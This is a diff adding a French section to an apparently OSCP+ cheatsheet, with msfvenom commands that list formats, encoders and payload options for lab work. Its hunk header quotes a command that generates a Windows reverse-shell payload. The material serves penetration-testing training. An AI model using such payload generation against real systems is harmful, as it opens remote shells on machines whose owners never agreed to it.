@@ -549,6 +549,45 @@ msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c 
 
 ```
 
+
+## Vérifier les formats et options de msfvenom
+
+Avant de générer un fichier dans un laboratoire, consulter les charges utiles et les formats réellement proposés par la version locale de Metasploit. Une charge utile ne garantit ni compatibilité ni exécution.
+
+### Afficher les formats compatibles
+
+Lister les formats disponibles avec la version locale de msfvenom.
+
+<p class="oscp-command-note">Afficher les formats compatibles.</p>
+
+```bash
+msfvenom --list formats
+```
+
+### Afficher les encodeurs disponibles
+
+Consulter les encodeurs installés. L'encodage n'est pas une garantie de contournement antivirus.
+
+<p class="oscp-command-note">Afficher les encodeurs disponibles.</p>
+
+```bash
+msfvenom --list encoders
+```
+
+### Consulter les options d'une charge utile
+
+Vérifier les paramètres obligatoires d'une charge utile avant toute utilisation en environnement autorisé.
+
+<p class="oscp-command-note">Consulter les options d'une charge utile.</p>
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp --list-options
+```
+
+**Référence complémentaire :** [krovs/oscp-notes](https://github.com/krovs/oscp-notes/blob/main/docs/13_exploitation.md). Explications rédigées pour SKILL-ISSUE.
+
+<!-- notes-krovs-2026 -->
+
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
